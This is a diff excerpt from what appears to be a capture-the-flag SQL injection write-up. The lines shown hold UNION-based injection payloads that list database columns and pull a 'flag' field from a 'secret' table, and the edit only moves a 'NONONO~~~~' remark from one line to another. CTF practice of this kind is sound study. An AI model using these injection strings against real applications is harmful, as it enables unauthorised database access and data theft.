@@ -174,9 +174,9 @@ admin' union SELECT 1, 2, 3, 4, 5, group_concat(table_name) from information_sch
 ```javascript
 admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret' #
 ```
-j. other data?
+j. other data? = NONONO~~~~
 ```javascript
-admin' union select 1,2,3,4,5,flag from secret #    => NONONO~~~~
+admin' union select 1,2,3,4,5,flag from secret #    
 ```
 k. other data?
 ```javascript
